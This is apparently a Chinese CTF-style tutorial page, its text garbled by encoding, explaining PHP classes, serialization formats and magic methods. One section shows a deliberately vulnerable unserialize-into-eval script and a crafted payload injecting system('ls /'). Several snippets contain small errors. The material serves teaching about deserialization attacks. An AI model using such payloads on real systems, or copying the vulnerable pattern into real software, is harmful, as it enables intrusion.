href="#ç±»çš„å®šä¹‰åŒ…å«å¯¹ç±»åçš„å®šä¹‰å¯¹æˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰çš„å®šä¹‰å¯¹æˆå‘˜å‡½æ•°çš„å®šä¹‰ï¼ˆæ–¹æ³•ï¼‰ä»¥ä¸‹ä¸ºä»£ç æ¼”ç¤º" class="headerlink" title="ç±»çš„å®šä¹‰åŒ…å«å¯¹ç±»åçš„å®šä¹‰å¯¹æˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰çš„å®šä¹‰å¯¹æˆå‘˜å‡½æ•°çš„å®šä¹‰ï¼ˆæ–¹æ³•ï¼‰ä»¥ä¸‹ä¸ºä»£ç æ¼”ç¤º"></a>ç±»çš„å®šä¹‰åŒ…å«å¯¹ç±»åçš„å®šä¹‰å¯¹æˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰çš„å®šä¹‰å¯¹æˆå‘˜å‡½æ•°çš„å®šä¹‰ï¼ˆæ–¹æ³•ï¼‰ä»¥ä¸‹ä¸ºä»£ç æ¼”ç¤º</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;benben&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xuanze</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¾“å‡º&quot;</span>ï¼›</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$p</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$p</span>-&gt;name;</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">xuanze</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ä¸­functionä»¥å‰çš„ä¸ºæˆå‘˜å±æ€§è€Œfunctionä¸ºæˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰<strong>è€Œ<code>$this-&gt;name</code>çš„æ„æ€ä¸ºè°ƒç”¨name</strong> <strong>è€Œ<code>$p=new text</code>æ˜¯å¯¹textè¿™ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œä½†æ˜¯åœ¨å®ä¾‹åŒ–çš„è¿‡ç¨‹æ˜¯å¹¶ä¸ä¼šå°†æˆå‘˜æ–¹æ³•å®ä¾‹åŒ–çš„</strong><br>ä»¥ä¸Šä»£ç ç»“æœå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">text <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [name] =&gt; benben</span><br><span class="line">    [name2] =&gt; dazhuang</span><br><span class="line">)<span class="comment">//print_r($p)è¾“å‡ºçš„å®ä¾‹$p</span></span><br><span class="line"></span><br><span class="line">benben<span class="comment">//ç”±echo $p-&gt;naem</span></span><br><span class="line">è¾“å‡º<span class="comment">//ç”±æˆå‘˜å‡½æ•°è¾“å‡ºçš„å†…å®¹</span></span><br></pre></td></tr></table></figure></p><h2 id="æƒé™ä¿®é¥°ç¬¦"><a href="#æƒé™ä¿®é¥°ç¬¦" class="headerlink" title="æƒé™ä¿®é¥°ç¬¦"></a>æƒé™ä¿®é¥°ç¬¦</h2><p>phpè®¿é—®çš„ä¿®é¥°ç¬¦æœ‰ä¸‰ç§<code>public</code> <code>protected</code> <code>private</code><br>publicæ˜¯å…¬å¼€çš„<br>æ˜¯å¤–éƒ¨å’Œå­ç±»éƒ½å¯ç”¨çš„<br>è€Œprivateæ˜¯ç§æœ‰çš„å¤–éƒ¨ä¸å¯ç”¨ä½†æ˜¯å­ç±»å¯ç”¨<br>protectedæ˜¯å—ä¿æŠ¤çš„å­ç±»ä¸å¤–éƒ¨éƒ½ä¸å¯ä½¿ç”¨<br>å…·ä½“ä»£ç å¦‚ä¸‹<br>å­ç±»å°±æ˜¯ç±»å‹çš„æˆå‘˜æ¥è‡ªçˆ¶ç±»çš„ç±»å‹ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  public  $name=&#x27;chengyaojin&#x27;;</span><br><span class="line">  private  $sex=&#x27;man&#x27;;</span><br><span class="line">  protected  $shengao=&#x27;165&#x27;;</span><br><span class="line">  function jineng($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class hero2 extends hero&#123;</span><br><span class="line">    function test()&#123;</span><br><span class="line">    echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $this-&gt;sex.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $this-&gt;shengao.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cyj= new hero();</span><br><span class="line">$cyj2=new hero2();</span><br><span class="line">echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $cyj2-&gt;test();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>å…¶ä¸­hero2å°±æ˜¯heroçš„å­ç±»ç±»å‹ä»¥å¤–å°±æ˜¯å¤–éƒ¨</p><h1 id="åºåˆ—åŒ–serialize"><a href="#åºåˆ—åŒ–serialize" class="headerlink" title="åºåˆ—åŒ–serialize"></a>åºåˆ—åŒ–serialize</h1><p>åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡å˜æˆä¸€å­—ç¬¦ä¸²<br>å¦‚ä¸‹ä»£ç <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    var $name=&quot;benben&quot;;  </span><br><span class="line">    var $name2=&quot;dazhuang&quot;;</span><br><span class="line"></span><br><span class="line">    function xuanze()&#123;</span><br><span class="line">        $this-&gt;name;</span><br><span class="line">        echo &quot;è¾“å‡º&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $p=new text();</span><br><span class="line">    print_r($p);</span><br><span class="line">    serialize($p);</span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>è¾“å‡ºå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; benben</span><br><span class="line">    [name2] =&gt; dazhuang</span><br><span class="line">)</span><br><span class="line">O:4:&quot;text&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;benben&quot;;s:5:&quot;name2&quot;;s:8:&quot;dazhuang&quot;;&#125;</span><br></pre></td></tr></table></figure><br>åé¢çš„ä¸€é•¿ä¸²å­—ç¬¦ä¸²å°±æ˜¯åºåˆ—åŒ–çš„ç»“æœä¸‹é¢æˆ‘ä¼šå¯¹åºåˆ—åŒ–çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œè®²è§£<br><code>O</code>ä»£è¡¨çš„æ˜¯<code>object</code>ä»£è¡¨äº†å¯¹è±¡è€ŒO:4:â€textâ€:2ä»£è¡¨äº†å¯¹è±¡åæœ‰<code>4</code>ä¸ªå­—ç¬¦å«<code>text</code>å†…å«æœ‰<code>2</code>ä¸ªæˆå‘˜å±æ€§<code>&#123;&#125;</code>å†…éƒ¨æ˜¯æˆå‘˜å˜é‡<br><code>s:4:&quot;name&quot;;s:6:&quot;benben&quot;;</code><br><code>s</code>ä»£è¡¨å­—ç¬¦ä¸²ï¼Œæ•´ä¸²ä»£è¡¨æˆå‘˜å˜é‡åçš„ç±»å‹æ˜¯å­—ç¬¦ä¸²æœ‰<code>4</code>ä¸ªå­—ç¬¦å«<code>name</code>å˜é‡çš„å€¼çš„ç±»å‹ä¸ºå­—ç¬¦ä¸²æœ‰<code>6</code>ä¸ªå­—ç¬¦å«<code>benben</code></p><h2 id="æ•°ç»„çš„åºåˆ—åŒ–"><a href="#æ•°ç»„çš„åºåˆ—åŒ–" class="headerlink" title="æ•°ç»„çš„åºåˆ—åŒ–"></a>æ•°ç»„çš„åºåˆ—åŒ–</h2><p>åŸºæœ¬æ‰€æœ‰ç±»å‹çš„å˜é‡éƒ½å¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ•°ç»„ä¹Ÿä¸€æ ·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = array(&#x27;benben&#x27;,&#x27;dazhuang&#x27;,&#x27;laoliu&#x27;);</span><br><span class="line">echo $a[0];</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>è¾“å‡ºä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benbena:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhuang&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span><br></pre></td></tr></table></figure><br>å…¶ä¸­<code>a</code>ä¸ºæ•°ç»„å<code>a:3</code>ä»£è¡¨æ•°ç»„å†…æœ‰<code>3</code>ä¸ªæ•°æ®ï¼Œ<code>i:1</code>ä»£è¡¨ä¸‹æ ‡ç±»å‹ä¸º<code>int</code>ï¼Œä¸‹æ ‡ä¸º<code>1</code>æ‰€ä»¥<code>i:0;s:6:&quot;benben&quot;</code>çš„æ„æ€ä¸ºä¸‹æ ‡ä¸º0çš„æ•°æ®ä¸ºå­—ç¬¦å‹æœ‰6ä¸ªå­—ç¬¦å«benben</p><h2 id="æƒé™ä¿®é¥°ç¬¦åºåˆ—åŒ–åçš„æ ¼å¼"><a href="#æƒé™ä¿®é¥°ç¬¦åºåˆ—åŒ–åçš„æ ¼å¼" class="headerlink" title="æƒé™ä¿®é¥°ç¬¦åºåˆ—åŒ–åçš„æ ¼å¼"></a>æƒé™ä¿®é¥°ç¬¦åºåˆ—åŒ–åçš„æ ¼å¼</h2><h3 id="ç§æœ‰çš„private"><a href="#ç§æœ‰çš„private" class="headerlink" title="ç§æœ‰çš„private"></a>ç§æœ‰çš„private</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    private $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;text&quot;:1ï¼š&#123;s:9:&quot;textpub&quot;;s:6:&quot;benben&quot;&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªè¾“å‡ºæˆ‘ä»¬å¯ä»¥å‘ç°ä»–çš„å˜é‡ååŠ äº†ä¸€ä¸ªtextå¹¶ä¸”å­—ç¬¦ä¸²é•¿åº¦æ˜æ˜¾æ¯”æ˜¾ç¤ºå‡ºæ¥çš„é•¿ä¸¤ä¸ªï¼Œè¿™æ˜¯å› ä¸ºtextpubçš„ä¸¤è¾¹å…¶å®è¿˜æœ‰ä¸¤ä¸ªçœ‹ä¸è§çš„ç©ºå­—ç¬¦</p><h3 id="å—ä¿æŠ¤çš„protected"><a href="#å—ä¿æŠ¤çš„protected" class="headerlink" title="å—ä¿æŠ¤çš„protected"></a>å—ä¿æŠ¤çš„protected</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    protected $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:6:&quot;*pub&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure><br>ä¹Ÿä¸€æ ·å¤šäº†ä¸ª*å¹¶ä¸”æ¯”æ˜¾ç¤ºçš„å­—ç¬¦ä¸²å¤šäº†ä¸¤ä¸ªå­—ç¬¦åŸå› åŒä¸Š</p><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    public  $a = &#x27;benben&#x27;;</span><br><span class="line">    protected  $b = 666;</span><br><span class="line">    private  $c = false;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = new test();</span><br><span class="line">$d = serialize($d);</span><br><span class="line">echo $d.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo urlencode($d).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">$a = urlencode($d);</span><br><span class="line">$b = unserialize(urldecode($a));</span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;benben&quot;;s:4:&quot;*b&quot;;i:666;s:7:&quot;testc&quot;;b:0;&#125;</span><br><span class="line">O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7D</span><br><span class="line">object(test)#1 (3) &#123; [&quot;a&quot;]=&gt; string(6) &quot;benben&quot; [&quot;b&quot;:protected]=&gt; int(666) [&quot;c&quot;:&quot;test&quot;:private]=&gt; bool(false) &#125;</span><br></pre></td></tr></table></figure><br>ååºåˆ—åŒ–é¡¾åæ€ä¹‰å°±æ˜¯åºåˆ—åŒ–é€†åº<br><strong>ååºåˆ—åŒ–åªä¸ä¼ å…¥ååºåˆ—åŒ–çš„å€¼æœ‰å…³ä¸å…¶ç±»æ— å…³</strong>ä¹Ÿå°±æ˜¯ååºåˆ—åŒ–ä¸ç±»æ— å…³åªè¦ä¿®æ”¹ååºåˆ—åŒ–çš„å‚æ•°å°±å¯ä»¥æ›´æ”¹ååºåˆ—åŒ–çš„å€¼</p><h1 id="ååºåˆ—åŒ–çš„ç®€å•ä¾‹é¢˜"><a href="#ååºåˆ—åŒ–çš„ç®€å•ä¾‹é¢˜" class="headerlink" title="ååºåˆ—åŒ–çš„ç®€å•ä¾‹é¢˜"></a>ååºåˆ—åŒ–çš„ç®€å•ä¾‹é¢˜</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$get = $_GET[&quot;benben&quot;];</span><br><span class="line">$b = unserialize($get);</span><br><span class="line">$b-&gt;displayVar() ;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å°†<code>$get</code>è¿›è¡Œååºåˆ—åŒ–ä¹‹åè°ƒç”¨æˆå‘˜å‡½æ•°<code>displayvar()</code>è€Œ<code>displayvar</code>çš„å†…å®¹æ˜¯åœ¨<code>eval()</code>å‡½æ•°é‡Œè°ƒç”¨æˆå‘˜å˜é‡<code>a</code><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªåºåˆ—åŒ–åçš„<code>text</code>ç±»å‹çš„å­—ç¬¦ä¸²ä¿®æ”¹å…¶ä¸­<code>$a</code>çš„å€¼ä¸º<code>å±é™©å‡½æ•°</code>å†å°†å…¶ä¼ å…¥<code>$get</code>é‡Œé‚£ä¹ˆå±é™©å‡½æ•°å°±ä¼šè¢«è°ƒç”¨åˆ°<code>eval</code>é‡Œå¯¼è‡´ä¿¡æ¯æ³„éœ²<br>ä¼ å…¥çš„getå€¼å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;text&quot;:1:&#123;s:1:&quot;a&quot;;s:15:&quot;system(&quot;ls /&quot;);&quot;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h1><p>é­”æœ¯æ–¹æ³•æ˜¯ä¸€ä¸ªé¢„å®šä¹‰å¥½çš„ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è‡ªåŠ¨è§¦å‘çš„è¡Œä¸ºæ–¹æ³•</p><h2 id="æŒæ¡é­”æœ¯æ–¹æ³•ä¸€å®šè¦æŒæ¡çš„å››ä¸ªç‚¹"><a href="#æŒæ¡é­”æœ¯æ–¹æ³•ä¸€å®šè¦æŒæ¡çš„å››ä¸ªç‚¹" class="headerlink" title="æŒæ¡é­”æœ¯æ–¹æ³•ä¸€å®šè¦æŒæ¡çš„å››ä¸ªç‚¹"></a>æŒæ¡é­”æœ¯æ–¹æ³•ä¸€å®šè¦æŒæ¡çš„å››ä¸ªç‚¹</h2><p><strong>1.è§¦å‘æ—¶æœº(é‡è¦)</strong><br><strong>2.åŠŸèƒ½</strong><br><strong>3.å‚æ•°(é‡è¦)</strong><br><strong>4.è¿”å›å€¼</strong></p><h2 id="1-construct-æ„é€ å‡½æ•°ï¼šåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰"><a href="#1-construct-æ„é€ å‡½æ•°ï¼šåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰" class="headerlink" title="1.__construct()æ„é€ å‡½æ•°ï¼šåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰"></a>1.__construct()æ„é€ å‡½æ•°ï¼šåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ï¼ˆå‡½æ•°ï¼‰</h2><p><strong>constructä¸­æ–‡åå«æ„é€ å‡½æ•°ã€‚é¡¾åæ€ä¹‰è¿™ä¸ªå‡½æ•°æ˜¯åœ¨æ„é€ å¯¹æ—¶ï¼ˆä¹Ÿå°±æ˜¯å®ä¾‹åŒ–æ—¶ï¼‰è§¦å‘çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘äº†æ„é€ å‡½æ•°ä¸€æ¬¡\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è§¦å‘äº†æ„é€ å‡½æ•°ä¸€æ¬¡</span><br><span class="line">benben</span><br><span class="line">O:4:&quot;text&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure><br>ä»ä»¥ä¸Šä»£ç å’Œè¾“å‡ºå¯ä»¥çœ‹å‡ºåœ¨å®ä¾‹åŒ–è§¦å‘äº†</strong>constructæ‰§è¡Œäº†<strong>constrctçš„å‘½ä»¤å°†nameèµ‹å€¼ä¸ºäº†è¾“å…¥çš„å‚æ•°<br>æ³¨æ„ï¼š`</strong>construct($name)`æ‹¬å·é‡Œçš„å‚æ•°åå¯è‡ªç”±æ›´æ”¹</p><h2 id="destruct-è§£æå‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–å¯¹è±¡æ˜¾å¼è¢«é”€æ¯æ—¶æ‰§è¡Œã€‚"><a href="#destruct-è§£æå‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–å¯¹è±¡æ˜¾å¼è¢«é”€æ¯æ—¶æ‰§è¡Œã€‚" class="headerlink" title="__destruct()è§£æå‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–å¯¹è±¡æ˜¾å¼è¢«é”€æ¯æ—¶æ‰§è¡Œã€‚"></a>__destruct()è§£æå‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–å¯¹è±¡æ˜¾å¼è¢«é”€æ¯æ—¶æ‰§è¡Œã€‚</h2><p><strong>destructåœ¨å®ä¾‹åŒ–å’Œååºåˆ—åŒ–é—´æ¥è§¦å‘<br>åŸå› æ˜¯åœ¨å®ä¾‹åŒ–åç±»ä¼šå˜æˆå¯¹è±¡ï¼Œä»£ç å®Œå…¨è¿è¡Œç»“æŸæ—¶(ä¹Ÿå°±æ˜¯ç¨‹åºç»“æŸæ—¶)ä¼šåˆ é™¤æ‰€æœ‰ä»£ç ï¼Œå°±ä¼šè§¦å‘ææ„å‡½æ•°<br>åœ¨ååºåˆ—æ—¶å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å†æ¬¡å˜æˆäº†å¯¹è±¡è€Œåï¼Œåœ¨ç¨‹åºç»“æŸæ—¶ç¨‹åºä¼šè‡ªåŠ¨é”€æ¯å¯¹è±¡å¯¼è‡´å…¶è§¦å‘</strong>destruct()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘äº†ææ„å‡½æ•°1æ¬¡\r\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;6\n&quot;</span>;<span class="comment">//åˆ¤æ–­æ˜¯åœ¨è¯¥ä»£ç å‰è§¦å‘è¿˜æ˜¯åè§¦å‘</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 